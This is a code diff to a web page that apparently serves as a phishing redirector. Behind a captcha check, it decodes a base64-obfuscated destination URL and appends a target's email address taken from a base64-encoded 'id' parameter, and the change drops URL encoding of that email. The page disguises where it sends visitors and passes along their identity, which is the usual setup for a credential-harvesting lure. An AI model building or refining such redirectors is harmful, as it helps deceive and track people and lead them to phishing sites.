@@ -195,26 +195,6 @@
       document.getElementById("message").innerText = '';
     }
 
-    function getRealEmail() {
-      const params = new URLSearchParams(window.location.search);
-      const raw = params.get("id");
-      if (!raw) return null;
-
-      // Try to decode from base64
-      try {
-        const base64Decoded = atob(raw);
-        const fullyDecoded = decodeURIComponent(base64Decoded);
-        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(fullyDecoded)) {
-          return fullyDecoded;
-        }
-      } catch (e) {
-        // Not base64 or error decoding — fallback to raw
-      }
-
-      // Clean raw (in case it has URL encoding like %40)
-      return decodeURIComponent(raw);
-    }
-
     function validateCaptcha() {
       const userAnswer = parseInt(document.getElementById("user-answer").value);
       const msg = document.getElementById("message");
@@ -235,6 +215,25 @@
       }
     }
 
+    function getRealEmail() {
+      const params = new URLSearchParams(window.location.search);
+      const raw = params.get("id");
+      if (!raw) return null;
+
+      try {
+        const base64Decoded = atob(raw);
+        const decoded = decodeURIComponent(base64Decoded);
+        if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded)) {
+          return decoded;
+        }
+      } catch (e) {
+        // Not base64, fallback
+      }
+
+      // Decode URI encoding if any (like %40)
+      return decodeURIComponent(raw);
+    }
+
     function redirectUser() {
       try {
         const decoded = atob(base64Ref);
@@ -248,7 +247,7 @@
 
         const email = getRealEmail();
         if (email) {
-          finalUrl += `?e=${encodeURIComponent(email)}`;
+          finalUrl += `?e=${email}`;
         }
 
         window.location.href = finalUrl;
